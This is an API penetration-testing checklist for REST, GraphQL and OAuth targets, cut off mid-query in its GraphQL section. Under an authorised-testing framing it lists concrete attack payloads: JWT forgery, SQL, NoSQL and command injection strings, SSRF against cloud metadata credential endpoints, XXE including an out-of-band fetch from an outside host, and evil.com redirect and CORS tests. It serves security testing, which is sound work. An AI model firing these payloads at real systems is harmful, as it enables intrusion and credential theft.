# API Penetration Testing Checklist

> **Scope:** REST · GraphQL · SOAP/XML · gRPC · WebSocket · OAuth 2.0 / OIDC · JWT

---

## PHASE 0 — PRE-ENGAGEMENT

### 0.1 Scoping & Legal
- [ ] Obtain **written authorization** (Rules of Engagement / SOW) — PTES §1
- [ ] Define **in-scope** API hosts, versions, environments (prod vs staging vs dev)
- [ ] Define **out-of-scope** endpoints (payment processors, third-party SSO, PII-heavy endpoints requiring extra care)
- [ ] Clarify **rate-limit thresholds** — DoS boundaries (especially for flood-based tests)
- [ ] Confirm **testing window** — production testing vs maintenance windows
- [ ] Establish **emergency contact** / kill-switch procedure
- [ ] Confirm **data classification** — can you create/read/modify real user data?
- [ ] Get **test accounts** at all privilege levels: anonymous, regular user, privileged user, admin, service account
- [ ] Confirm **VPN / IP whitelisting** if WAF is in scope vs out of scope
- [ ] Document **tech stack** if provided: language, framework, API gateway, auth provider

### 0.2 Environment Setup
- [ ] Burp Suite Pro configured with upstream proxy if needed
- [ ] Set up **separate browser profile** or device for each test user role
- [ ] Install key Burp extensions: `Autorize`, `InQL`, `Param Miner`, `JWT Editor`, `Hackvertor`, `Upload Scanner`, `Turbo Intruder`, `Logger++`, `JSON Web Tokens`, `403 Bypasser`
- [ ] Configure `mitmproxy` or `Charles Proxy` as fallback
- [ ] Install: `ffuf`, `kiterunner (kr)`, `arjun`, `nuclei`, `jwt_tool`, `sqlmap`, `wfuzz`, `nikto`, `ghauri`, `dalfox`
- [ ] Clone: `SecLists`, `fuzzdb`, `Assetnote Wordlists`, `PayloadsAllTheThings`
- [ ] Set up note-taking template (Obsidian / Notion / CherryTree)
- [ ] Prepare **evidence capture** pipeline: screenshots, HTTP request/response logs, video recording (OBS or `asciinema`)

---

## PHASE 1 — RECONNAISSANCE & API DISCOVERY

> **Goal:** Build a complete map of every API endpoint, version, parameter, and authentication mechanism before testing begins.  
> **References:** OWASP WSTG-APIT-01, PTES Intelligence Gathering, NIST SP 800-115 §4.1

### 1.1 Passive Reconnaissance

#### Search Engine Dorking
```
# Google Dorks
site:target.com inurl:/api/
site:target.com inurl:swagger
site:target.com intitle:"Swagger UI"
site:target.com filetype:json api
inurl:"/api/v1" site:target.com
site:target.com inurl:"graphql"
site:target.com inurl:"/wp-json/"
"api_key" site:target.com ext:env OR ext:yaml OR ext:json
"Authorization: Bearer" site:target.com ext:log
inurl:/api/v1/swagger.json site:target.com
```

#### Shodan / Censys Queries
```
# Shodan
hostname:"api.target.com"
hostname:"target.com" http.title:"Swagger UI"
hostname:"target.com" "content-type: application/json"
http.component:"Swagger" hostname:"target.com"
hostname:"target.com" "200 OK" port:8080 OR port:3000 OR port:8443

# Censys
services.http.response.headers.content_type="application/json" AND parsed.names=target.com
```

#### GitHub / GitLab Dorking (truffleHog / gitleaks)
```bash
# Search GitHub for secrets
trufflehog github --org=<orgname> --token=$GITHUB_TOKEN
gitleaks detect --source=. --report-format json --report-path=leaks.json

# Manual GitHub dorks
org:target "api_key"
org:target "Authorization: Bearer"
org:target filename:.env "API"
org:target "swagger" extension:json
org:target "x-api-key"
```

- [ ] Check **Wayback Machine** / `gau` / `waymore` for historical API endpoints
  ```bash
  gau --subs target.com | grep -E '/api/|/graphql|/v[0-9]'
  waymore -i target.com -mode U -oU urls.txt
  ```
- [ ] Check **npm/PyPI/Maven** packages published by target for embedded API base URLs
- [ ] Check mobile app APK/IPA for hardcoded endpoints (`apktool` + `jadx` for Android, `class-dump` + Hopper for iOS)
- [ ] Check JS files for API endpoints
  ```bash
  # LinkFinder
  python3 linkfinder.py -i https://target.com -d -o cli
  
  # JSluice
  jsluice urls < app.js
  
  # katana (Projectdiscovery)
  katana -u https://target.com -jc -d 5 | grep '/api'
  
  # Manual: look in bundled JS for fetch/axios/XMLHttpRequest calls
  curl -s https://target.com/app.js | grep -Eo '"(/api/[^"]+)"' | sort -u
  ```

### 1.2 Active Reconnaissance — API Discovery

#### Endpoint Discovery / Fuzzing
```bash
# FFUF — directory brute force
ffuf -u https://target.com/FUZZ -w /path/to/SecLists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,307,401,403 -t 50 -o ffuf_endpoints.json

# FFUF — version fuzzing
ffuf -u https://target.com/api/FUZZ/ -w /path/to/versions.txt -mc 200,401,403

# Kiterunner — context-aware API fuzzing (best tool for REST)
kr scan https://target.com/api -A=apiroutes-210228:20000 -x 20 --fail-status-codes 400,404,500
kr scan https://target.com -w /path/to/routes.kite -A=apiroutes-240128.txt

# Feroxbuster — recursive
feroxbuster -u https://target.com/api -w /path/to/wordlist.txt -x json,yaml -d 3 --auto-tune

# Gobuster
gobuster dir -u https://target.com -w /path/to/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -b 400,404 -o gobuster.txt
```

**Wordlists to use:**
- `SecLists/Discovery/Web-Content/api/` (REST endpoints)
- `SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt`
- Assetnote `httparchive_apiroutes_2024_01_28.txt` (https://wordlists.assetnote.io/)
- `fuzzdb/discovery/common-methods/common-methods.txt`
- `chrislockard/api_wordlist`

#### Documentation Discovery
- [ ] Try common Swagger/OpenAPI paths:
  ```
  /swagger.json          /swagger.yaml          /swagger.yml
  /swagger-ui.html       /swagger-ui/           /swagger-ui/index.html
  /api-docs              /api-docs/swagger.json /api/swagger.json
  /v1/swagger.json       /v2/api-docs           /v3/api-docs
  /openapi.json          /openapi.yaml          /api.json
  /docs                  /api/docs              /redoc
  /.well-known/api-catalog
  ```
- [ ] Import Swagger/OpenAPI spec into Burp Suite (`OpenAPI Parser` extension) to auto-map all endpoints
- [ ] Check for **Postman collections** leaked in docs or repos: `site:github.com "target.com" "postman_collection"`
- [ ] Check WSDL for SOAP services: `?wsdl`, `?WSDL`, `/service.wsdl`, `SoapUI` / `WSDLer` Burp extension
- [ ] Try `/.well-known/openid-configuration` and `/.well-known/oauth-authorization-server` for auth metadata

#### Subdomain & Port Discovery
```bash
# Subdomain enum
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com

# Port scan for non-standard API ports
nmap -p 3000,4000,5000,8000,8080,8443,8888,9000,9200,9300,27017 --open target.com

# Look for dev/staging APIs
ffuf -u https://FUZZ.target.com/api -w /path/to/subdomains.txt -mc 200,401,403
```

#### HTTP Method Enumeration
```bash
# For each discovered endpoint, test all HTTP verbs
curl -X OPTIONS https://target.com/api/v1/users -i
# Methods to test: GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS, TRACE, CONNECT, INVENTED

# Burp Suite Intruder: use built-in HTTP verbs wordlist
# Position: [METHOD] /api/v1/users HTTP/1.1
```
- [ ] Note which methods return **200/201** vs **405 Method Not Allowed** — discrepancies reveal hidden functionality
- [ ] Test `X-HTTP-Method-Override: DELETE` / `X-Method-Override` headers to bypass method restrictions

### 1.3 Traffic Analysis
- [ ] Configure **Burp Suite as proxy** and browse/use application normally (authenticated) to passively capture all API calls
- [ ] Use **mobile app** (if applicable) through Burp proxy — mobile often calls different or undocumented endpoints
- [ ] Review **browser DevTools Network tab** for API calls during normal app usage
- [ ] Capture WebSocket traffic through Burp Suite's WebSocket history
- [ ] Export all captured endpoints to a master list (Burp `Target > Site Map > Export`)

---

## PHASE 2 — AUTHENTICATION TESTING

> **References:** OWASP API2:2023 Broken Authentication | CWE-287, CWE-345, CWE-798 | WSTG-ATHN

### 2.1 Authentication Mechanism Fingerprinting
- [ ] Identify auth type: **API Key** (header/query), **HTTP Basic**, **JWT Bearer**, **OAuth 2.0**, **OIDC**, **SAML**, **mTLS**, **HMAC**, **Session Cookie**, **Custom Token**
- [ ] Determine where tokens are transmitted: `Authorization` header, query param `?token=`, cookie, custom header (`X-API-Key`, `X-Auth-Token`)
- [ ] Check if HTTPS is enforced everywhere (no HTTP fallback)

### 2.2 JWT Testing
```bash
# jwt_tool — full attack suite
jwt_tool <token> -M at   # Run all tampering checks
jwt_tool <token> -X a    # Algorithm confusion RS256→HS256
jwt_tool <token> -X n    # "none" algorithm bypass
jwt_tool <token> -X s    # JWKS spoof / key injection
jwt_tool <token> -C -d /path/to/wordlist.txt  # Crack weak secret
jwt_tool <token> -T      # Tamper mode (manual payload editing)

# Decode and inspect manually
echo "<payload_part>" | base64 -d | jq .
```

**JWT Attack Checklist:**
- [ ] **Algorithm: none** — replace `alg` with `none`, remove signature
- [ ] **Algorithm confusion** — change RS256 to HS256, sign with RS256 public key as HMAC secret
- [ ] **Weak secret brute-force** — `hashcat -a 0 -m 16500 <jwt> /path/to/rockyou.txt`
- [ ] **JWKS injection / key confusion** — embed attacker-controlled JWK in header (`jwk`, `jku`, `x5u` parameters)
- [ ] **`kid` SQL injection** — `"kid": "' UNION SELECT 'attacker_secret'--"`
- [ ] **`kid` path traversal** — `"kid": "../../dev/null"` → sign with empty string
- [ ] **Expired token acceptance** — test with `exp` set in the past
- [ ] **Reuse of revoked/logged-out tokens**
- [ ] **Sensitive data in payload** — PII, internal IDs, role information
- [ ] **Privilege escalation** — modify `role`, `admin`, `is_superuser` claims, re-sign if weak secret found

### 2.3 API Key Testing
- [ ] Are API keys **exposed in URLs** (show up in logs/referrer headers)? Should be in headers only
- [ ] Check for **hardcoded keys** in JS files, mobile app, GitHub (truffleHog, gitleaks)
- [ ] Test **key privilege scope** — does a read key allow write operations?
- [ ] Check for **key rotation / revocation** — does old key still work after rotation?
- [ ] Test key in different positions: `?api_key=`, `X-API-Key:`, `Authorization: ApiKey`
- [ ] Check `/.env`, `/config`, `/app/config.json` for exposed key files (403 → try path traversal)
- [ ] **Predictable keys**: are keys sequential, UUIDs v1 (time-based), or weak random?

### 2.4 OAuth 2.0 / OIDC Testing
```
# Discover OAuth configuration
GET /.well-known/openid-configuration
GET /.well-known/oauth-authorization-server
```

- [ ] **Open Redirect via `redirect_uri`** — `redirect_uri=https://evil.com`, `redirect_uri=https://target.com.evil.com`, `redirect_uri=https://target.com@evil.com`
- [ ] **`redirect_uri` path traversal** — `https://target.com/callback/../evil`
- [ ] **CSRF via missing/weak `state` parameter** — is `state` validated? Is it random?
- [ ] **Authorization code reuse** — replay authorization code after token exchange
- [ ] **PKCE bypass** — test flows where `code_challenge` is absent or not validated
- [ ] **Token leakage via Referer** — does the auth code appear in Referer headers to third-party resources?
- [ ] **Scope escalation** — add `scope=admin`, `scope=openid profile email admin`
- [ ] **Implicit flow misuse** — `response_type=token` leaks access tokens in URL fragments
- [ ] **Token substitution** — swap ID token / access token between services with same IdP
- [ ] **SSRF via `logo_uri` / `jwks_uri` / `initiate_login_uri`** in dynamic client registration
- [ ] **Client credential leakage** — `client_secret` exposed in JS or mobile app
- [ ] Test for **password grant type** enabled (deprecated, insecure) — try `grant_type=password`

### 2.5 Basic / Session Auth Testing
- [ ] **Brute force / credential stuffing** with rate limit and lockout testing
  ```bash
  # Hydra
  hydra -L users.txt -P passwords.txt target.com http-post-form "/api/v1/login:username=^USER^&password=^PASS^:Invalid"
  
  # Wfuzz
  wfuzz -c -z file,users.txt -z file,pass.txt -d '{"username":"FUZZ","password":"FUZ2Z"}' -u https://target.com/api/v1/login
  ```
- [ ] **Username enumeration** — different response times, codes, or messages for valid vs invalid usernames
- [ ] **Default credentials** — `admin:admin`, `admin:password`, `test:test`, `api:api`
- [ ] Check if **password reset tokens** are long-lived, guessable, or reusable
- [ ] Test **session fixation** — can you supply a pre-known session ID before login?
- [ ] Check `Set-Cookie` attributes: `HttpOnly`, `Secure`, `SameSite`

---

## PHASE 3 — AUTHORIZATION TESTING

> This is where the majority of **critical / high** bugs live. Allocate maximum time here.  
> **References:** OWASP API1:2023 BOLA, API3:2023 BOPLA, API5:2023 BFLA | CWE-639, CWE-284, CWE-285 | WSTG-AUTHZ

### 3.1 BOLA / IDOR Testing (API1:2023)
> BOLA (Broken Object Level Authorization) = IDOR at the API level. Accounts for ~40% of all API attacks.

**Setup:** Create **minimum 2 test accounts** (UserA and UserB) with the same role. Capture all object references exposed in responses (IDs, GUIDs, hashes, filenames).

```bash
# Autorize (Burp Extension) — automated BOLA/BFLA detection
# 1. Add UserB's cookies/token to Autorize configuration
# 2. Browse as UserA — Autorize replays every request with UserB's token
# 3. Look for green (Bypassed) entries in Autorize table

# Manual curl test
# UserA creates object → get object_id
curl -H "Authorization: Bearer <UserA_token>" -X POST https://target.com/api/v1/items -d '{"name":"test"}'
# Response: {"id": "1337", ...}

# UserB accesses UserA's object
curl -H "Authorization: Bearer <UserB_token>" https://target.com/api/v1/items/1337
```

**ID Types to Test:**
- [ ] Sequential integers: `1337` → try `1336`, `1338`, `1`, `0`, `-1`, `2147483647`
- [ ] UUIDs v1 (time-based) — predictable; use `uuidtool` to generate nearby UUIDs
- [ ] UUIDs v4 — test if exposed in other API responses (harvesting vs guessing)
- [ ] Hashed IDs (MD5/SHA1 of integer) — hash known IDs to find the pattern
- [ ] Base64-encoded objects — decode and re-encode with modified values
- [ ] Indirect references in request body (`{"report_id": 42}`) not just path params

**Test Scenarios:**
- [ ] **GET** another user's object via ID swap
- [ ] **PUT/PATCH** to modify another user's object
- [ ] **DELETE** another user's object
- [ ] Access object via **nested paths**: `GET /api/v1/users/1337/messages` (is `1337` validated?)
- [ ] Cross-tenant access (multi-tenant SaaS): access org B's data while authenticated as org A user
- [ ] **State-based BOLA**: access objects in states the user shouldn't see (e.g., draft orders, pending approvals)
- [ ] Test **admin-scoped objects** with regular user token
- [ ] Test object access through **related endpoints** (e.g., `/comments?post_id=1337` vs `/posts/1337/comments`)

### 3.2 BOPLA — Broken Object Property Level Authorization (API3:2023)
> Combining Excessive Data Exposure (2019) + Mass Assignment (2019)

#### Excessive Data Exposure
- [ ] Compare **fields returned vs fields displayed** in UI — look for extra sensitive fields in raw API response (SSN, password_hash, secret keys, internal flags, other users' data)
- [ ] Test **GraphQL field selection** — query for fields not shown in UI
- [ ] Look for sensitive fields: `password`, `secret`, `token`, `api_key`, `internal_id`, `is_admin`, `balance`, `ssn`, `dob`
- [ ] Test response with **lower-privilege token** — does server filter sensitive fields?

#### Mass Assignment
```bash
# Identify object properties from GET responses:
GET /api/v1/users/me → {"id":1,"username":"alice","email":"...","role":"user"}

# Attempt to mass-assign privileged properties on POST/PUT/PATCH:
PUT /api/v1/users/me
{"username":"alice","email":"alice@test.com","role":"admin","is_admin":true,"balance":999999}

# Try adding undocumented properties the model might have:
POST /api/v1/users {"username":"x","password":"x","is_verified":true,"email_verified":true}

# Common privilege escalation targets:
"admin": true
"role": "admin"
"is_admin": true
"group": "admins"
"account_type": "premium"
"credits": 99999
"verified": true
"approved": true
"status": "active"
```
- [ ] Use **Param Miner** (Burp extension) to discover undocumented parameters
- [ ] Use **Arjun** for parameter discovery:
  ```bash
  arjun -u https://target.com/api/v1/users -m POST --json
  arjun -u https://target.com/api/v1/users/me -m PUT --json
  ```
- [ ] Review JS source and API spec for all object properties and test all on write endpoints

### 3.3 BFLA — Broken Function Level Authorization (API5:2023)
> Regular users calling admin/privileged endpoints

- [ ] Map all **admin/privileged endpoints** discovered in docs, JS, or fuzzing
- [ ] Replay admin-level requests with regular user token
- [ ] Test for **horizontal privilege escalation** between users of the same role
- [ ] Test for **vertical privilege escalation** by calling higher-privilege functions

```
# Common admin endpoint patterns to test with user tokens:
GET  /api/v1/admin/users
POST /api/v1/admin/users
GET  /api/v1/admin/config
PUT  /api/v1/admin/settings
DELETE /api/v1/admin/users/{id}
POST /api/v1/users/{id}/promote
POST /api/v1/users/{id}/ban
GET  /api/v1/reports/all
POST /api/v1/system/restart
GET  /api/v1/internal/metrics
```

**Bypass Techniques:**
- [ ] Add headers: `X-Original-URL: /admin/users`, `X-Rewrite-URL: /admin/users`, `X-Custom-IP-Authorization: 127.0.0.1`, `X-Forwarded-For: 127.0.0.1`
- [ ] Path traversal in URL: `/api/v1/users/../admin/users`
- [ ] URL encoding: `/api/v1/admin%2fusers`, `/api/v1/%61dmin/users`
- [ ] HTTP verb tampering: `HEAD`, `OPTIONS`, `CONNECT`, or arbitrary method instead of `GET`
- [ ] Case modification: `/API/v1/Admin/Users`, `/api/V1/USERS`
- [ ] Add `..;/` suffix: `/api/v1/users..;/admin/config`
- [ ] Try with different `Content-Type`: `application/json` → `application/x-www-form-urlencoded`
- [ ] Test with no `Authorization` header — is the endpoint accidentally public?

---

## PHASE 4 — INPUT VALIDATION & INJECTION TESTING

> **References:** WSTG-INPV | CWE-89, CWE-79, CWE-78, CWE-918, CWE-611, CWE-502 | PayloadsAllTheThings

### 4.1 SQL Injection
```bash
# Single-quote test on all string params
GET /api/v1/users?id=1'
POST /api/v1/search {"query": "test'"}

# UNION-based
GET /api/v1/products?category=1 UNION SELECT null,username,password FROM users--

# Boolean-based blind
GET /api/v1/users?id=1 AND 1=1   # true
GET /api/v1/users?id=1 AND 1=2   # false

# Time-based blind
GET /api/v1/users?id=1; WAITFOR DELAY '0:0:5'--   # MSSQL
GET /api/v1/users?id=1 AND SLEEP(5)               # MySQL

# sqlmap
sqlmap -u "https://target.com/api/v1/users?id=1" --batch --level=3 --risk=2 -p id
sqlmap -u "https://target.com/api/v1/users" --data='{"id":"1"}' --content-type="application/json" --batch

# ghauri (modern, DAST-focused)
ghauri -u "https://target.com/api/v1/users?id=1" --level=3
```

### 4.2 NoSQL Injection
```bash
# MongoDB injection
{"username": {"$gt": ""}, "password": {"$gt": ""}}           # Auth bypass
{"username": "admin", "password": {"$regex": "^a"}}           # Blind extraction
{"username": {"$where": "1==1"}}                              # JS injection
{"$or": [{"username":"admin"},{"username":"test"}]}

# HTTP param version
username[$gt]=&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
```

- [ ] Test all string parameters with NoSQL injection payloads
- [ ] Test JSON body fields with MongoDB operators (`$gt`, `$ne`, `$regex`, `$where`, `$elemMatch`)
- [ ] Use `nosqlmap` or `nosqli` tool for automation

### 4.3 Server-Side Request Forgery (SSRF) — (API7:2023)
> **References:** CWE-918 | OWASP API7:2023

```bash
# Basic SSRF
{"url": "http://169.254.169.254/latest/meta-data/"}            # AWS IMDS v1
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"url": "http://metadata.google.internal/computeMetadata/v1/"} # GCP
{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"} # Azure

# Bypass filters
{"url": "http://[::ffff:169.254.169.254]/"}                    # IPv6
{"url": "http://0177.0.0.1/"}                                  # Octal
{"url": "http://0xa9fea9fe/"}                                   # Hex
{"url": "http://2130706433/"}                                   # Decimal 127.0.0.1
{"url": "http://localtest.me/"}                                 # DNS to 127.0.0.1
{"url": "http://target.com@evil.com/"}                         # URL confusion

# Internal network probing
{"url": "http://192.168.1.1:80"}
{"url": "http://internal-service:8080/api/admin"}
{"url": "file:///etc/passwd"}
{"url": "dict://localhost:11211/stat"}                          # Memcached
{"url": "gopher://localhost:6379/_INFO"}                        # Redis

# OAST-based blind SSRF
{"url": "http://<collab>.burpcollaborator.net"}
{"url": "http://<id>.interactsh.com"}
```

- [ ] Test in **all URL-accepting parameters**: `url`, `callback`, `webhook`, `redirect`, `src`, `href`, `file`, `path`, `image_url`, `fetch`, `import`, `export`
- [ ] Check OAuth `logo_uri`, `jwks_uri`, `client_uri` fields (dynamic client registration)
- [ ] Test **PDF/HTML generation** endpoints with embedded URLs
- [ ] Test **webhook configuration** endpoints

### 4.4 XML / XXE Injection
```xml
<!-- Basic XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

<!-- Blind OOB XXE -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collab.burpcollaborator.net/evil.dtd"> %xxe;]>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```
- [ ] Test any endpoint accepting XML input or `Content-Type: application/xml`
- [ ] Try switching `Content-Type: application/json` → `application/xml` on POST endpoints
- [ ] Test SOAP APIs (WSDL endpoints) thoroughly for XXE
- [ ] Use Burp Suite's "Scan" feature on XML endpoints; also try manually

### 4.5 Command Injection
```bash
# Test in string parameters that might reach shell
; ls -la
&& whoami
| id
`id`
$(id)
;ping -c 1 <collab>.burpcollaborator.net;
&ping -c 1 <collab>.burpcollaborator.net&
```
- [ ] Test parameters that suggest file operations, system commands, or OS interaction: `filename`, `exec`, `cmd`, `command`, `path`, `target`, `host`, `domain`, `ping`
- [ ] Use Burp Collaborator for blind command injection detection

### 4.6 SSTI — Server-Side Template Injection
```
# Detection polyglot
{{7*7}}        # → 49 (Jinja2, Twig)
${7*7}         # → 49 (FreeMarker, Spring EL)
<%= 7*7 %>     # → 49 (ERB/Ruby)
#{7*7}         # → 49 (Pebble, JEXL)
*{7*7}         # → 49 (Thymeleaf)
```
- [ ] Test all string parameters in request body and path (e.g., name, template, message, content fields)
- [ ] Check error messages for template engine fingerprinting

### 4.7 XSS in API Responses
- [ ] Test string parameters with `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
- [ ] Check if API response is consumed by a web frontend that renders HTML
- [ ] Test `Content-Type: text/html` responses specifically
- [ ] Use **DalFox** for automated XSS discovery:
  ```bash
  dalfox url "https://target.com/api/v1/search?q=test" --deep-domxss
  ```

### 4.8 HTTP Parameter Pollution (HPP) & HTTP Request Smuggling
```
# HPP — duplicate parameters
GET /api/v1/transfer?amount=100&to=attacker&amount=0

# JSON HPP
{"amount": 100, "to": "attacker", "amount": 0}

# HTTP Request Smuggling (CL.TE / TE.CL)
# Use Burp Suite HTTP Request Smuggler extension
# Use smuggler.py tool
python3 smuggler.py -u https://target.com/api/v1/endpoint
```
- [ ] Test duplicate parameter handling — note RFC says first wins, but frameworks vary
- [ ] Test array parameters: `?id[]=1&id[]=2`, `?id=1,2`, `?ids=1&ids=2`

---

## PHASE 5 — RATE LIMITING & RESOURCE CONSUMPTION TESTING

> **References:** OWASP API4:2023 Unrestricted Resource Consumption | CWE-770, CWE-400

### 5.1 Rate Limiting Tests
```bash
# Turbo Intruder (Burp) — race conditions / rate limit bypass
# Use "race-single-packet-attack" template for login endpoint

# Wfuzz — brute force test
wfuzz -c -z range,1-100 -d '{"otp":"FUZZ"}' https://target.com/api/v1/verify_otp

# Test rate limit on:
# - Login endpoint (credential stuffing)
# - OTP/2FA verification  
# - Password reset (enumeration + brute)
# - SMS sending (billing abuse)
# - Account creation (spam abuse)
# - Expensive data export endpoints
```

**Rate Limit Bypass Techniques:**
- [ ] Change IP via `X-Forwarded-For: 1.2.3.4`, `X-Real-IP: 1.2.3.4`, `X-Originating-IP`, `Client-IP` (cycle through IPs)
- [ ] Null byte injection in email: `victim@target.com%00`, `victim+1@target.com`
- [ ] Change `User-Agent` header between requests
- [ ] Use **different endpoints** for same operation (v1 vs v2, trailing slash, different casing)
- [ ] **Race condition** — send requests simultaneously (Burp Turbo Intruder, `async/await` multi-thread)
- [ ] Try **array-based batching**: `[{"otp":"0000"},{"otp":"0001"},...,{"otp":"9999"}]` in single request

### 5.2 Unrestricted Resource Consumption
- [ ] Test **pagination limits**: `?limit=99999&offset=0`, `?per_page=999999`
- [ ] Test **large payload uploads** (memory exhaustion): huge JSON/XML payloads
- [ ] Test **deeply nested JSON** / XML payload (stack overflow / ReDoS)
- [ ] Test **expensive search patterns**: long `LIKE` queries, complex regex patterns
- [ ] Test **bulk operations** without limits
- [ ] Test **file upload size** limits (and type restrictions)
- [ ] Check for **missing pagination** on list endpoints (infinite data return)

---

## PHASE 6 — BUSINESS LOGIC TESTING

> **References:** OWASP API6:2023 Unrestricted Access to Sensitive Business Flows | OWASP Testing Guide WSTG-BUSL | CWE-840

- [ ] **Workflow bypass**: Skip steps in multi-step processes (checkout without payment, verification without OTP)
- [ ] **Negative values**: `{"amount": -100}` to credit instead of debit
- [ ] **Decimal manipulation**: `{"amount": 0.001}` — does currency rounding work in attacker's favor?
- [ ] **Race conditions in financial flows**: double-spend, double withdrawal
  ```bash
  # Turbo Intruder simultaneous requests
  # Send 10 simultaneous requests to /api/v1/redeem_coupon with same coupon code
  ```
- [ ] **State machine bypass**: access `completed` state endpoint from `pending` state
- [ ] **Referral abuse**: can you refer yourself? Can referral loop generate infinite credits?
- [ ] **Coupon/promo code reuse**: try replaying used promo codes, stacking non-stackable coupons
- [ ] **Shipping/billing manipulation**: change shipping address after payment, use multiple discount codes
- [ ] **Auction/bid sniping abuse**: timestamp manipulation, bid cancellation after winning
- [ ] Test **API version downgrade**: use v1 endpoint that may lack security controls added in v2
- [ ] Test **account deletion flows**: can you access data after deletion? Is it soft-delete with accessible data?
- [ ] **Transfer/transaction idempotency**: are transfer endpoints idempotent? Can you replay?

---

## PHASE 7 — SECURITY MISCONFIGURATION TESTING

> **References:** OWASP API8:2023 Security Misconfiguration | CWE-16, CWE-200, CWE-614

### 7.1 Transport Security
- [ ] Test for **TLS downgrade**: force HTTP where HTTPS expected
- [ ] Check **TLS version**: SSLv3, TLS 1.0/1.1 should be disabled (`testssl.sh`, `nmap --script ssl-enum-ciphers`)
- [ ] Check **HSTS header** presence and `max-age`
- [ ] Test **certificate validation** (especially in mobile apps — SSL pinning bypass)

### 7.2 CORS Testing
```bash
# Test CORS with malicious origin
curl -H "Origin: https://evil.com" https://target.com/api/v1/user/me -v

# Look for:
# Access-Control-Allow-Origin: https://evil.com  (reflected origin — CRITICAL)
# Access-Control-Allow-Origin: *  (check if combined with credentials)
# Access-Control-Allow-Credentials: true  (if combined with reflected origin — account takeover)

# Null origin bypass
curl -H "Origin: null" https://target.com/api/v1/user/me -v
```
- [ ] Test CORS origin reflection (any origin trusted) — especially on auth'd endpoints
- [ ] Check `Access-Control-Allow-Credentials: true` combined with `Access-Control-Allow-Origin: *` or reflected origin
- [ ] Test subdomain wildcard: if `*.target.com` trusted, find XSS on any subdomain
- [ ] Test `null` origin (sandboxed iframes)

### 7.3 Security Headers
- [ ] `X-Content-Type-Options: nosniff` — present?
- [ ] `X-Frame-Options` / `Content-Security-Policy: frame-ancestors` — clickjacking protection?
- [ ] `Content-Security-Policy` — configured? Weak directives (`unsafe-inline`, `unsafe-eval`, wildcard `*`)?
- [ ] `Strict-Transport-Security` — present and `max-age` sufficient?
- [ ] `X-XSS-Protection` — legacy but still checked
- [ ] `Referrer-Policy` — leaking tokens via Referer?
- [ ] `Cache-Control: no-store` on sensitive API responses — is sensitive data being cached?

### 7.4 Error Handling & Information Disclosure
- [ ] Test for **verbose error messages** leaking: stack traces, SQL queries, internal paths, framework versions
  ```bash
  # Trigger errors deliberately
  GET /api/v1/users/' HTTP/1.1           # SQLi char
  GET /api/v1/users/undefined            # Type error
  GET /api/v1/users/9999999999999999     # Integer overflow
  POST /api/v1/users Content-Type: text/plain  # Wrong content type
  ```
- [ ] Check `Server`, `X-Powered-By`, `X-AspNet-Version` response headers → remove/spoof these
- [ ] Check for exposed **debug endpoints**: `/debug`, `/trace`, `/actuator`, `/health`, `/metrics`, `/env`, `/info`
  ```bash
  # Spring Boot Actuator endpoints (critical — full RCE in some configs)
  /actuator
  /actuator/env
  /actuator/beans
  /actuator/mappings
  /actuator/heapdump
  /actuator/jolokia
  /actuator/gateway/routes
  ```
- [ ] Test `TRACE` HTTP method — may echo request headers including auth tokens
- [ ] Check `OPTIONS` response for allowed methods on sensitive endpoints

### 7.5 Outdated / Shadow API Detection (API9:2023)
- [ ] Fuzz for **older API versions**: `/api/v0/`, `/api/v1/`, `/v2/`, `/legacy/`, `/beta/`, `/old/`, `/test/`
- [ ] Test if **deprecated endpoints** still function — often have weaker security than current versions
- [ ] Check for **undocumented endpoints** via JS analysis, mobile app decompile, and error messages
- [ ] Map all API versions and test security controls consistently across all versions
- [ ] Check for internal/dev APIs exposed externally: `/internal/`, `/dev/`, `/staging/`, `/debug/`

---

## PHASE 8 — GRAPHQL-SPECIFIC TESTING

> **References:** OWASP API1/2/3/4/5/8 (all apply to GraphQL) | CWE-284, CWE-200, CWE-400

### 8.1 Discovery & Schema Extraction
```bash
# Find GraphQL endpoint
# Common paths: /graphql, /graphiql, /gql, /api/graphql, /query, /graphql/v1

# Test if introspection is enabled
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Full introspection dump
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }"}'

# InQL Burp Extension — automated GraphQL schema extraction and testing
# GraphQL Raider — Burp extension for GraphQL mutation testing
```

**Introspection Disabled? Try:**
- [ ] `__type(name: "User") { fields { name } }` (field-level introspection sometimes allowed)
- [ ] `{ __typename }` — basic type check
- [ ] Clairvoyance tool — wordlist-based schema recovery when introspection disabled

### 8.2 GraphQL Authorization Attacks
- [ ] Test **BOLA** on all object fields with IDs — change `userId`, `orderId`, `documentId` etc.
- [ ] Test **BFLA** — can regular user call admin mutations? (`createUser`, `deleteUser`, `updateRole`)
- [ ] Test **field-level authorization** — can you query sensitive fields (`password`, `apiKey`, `secret`) that belong to other users?
- [ ] Test **nested object access** — accessing related objects through permitted objects to reach restricted data

### 8.3 GraphQL DoS Attacks
```graphql
# Deeply nested query (recursive)
query {
  user {
    friends {
      friends {
        friends {
          friends {
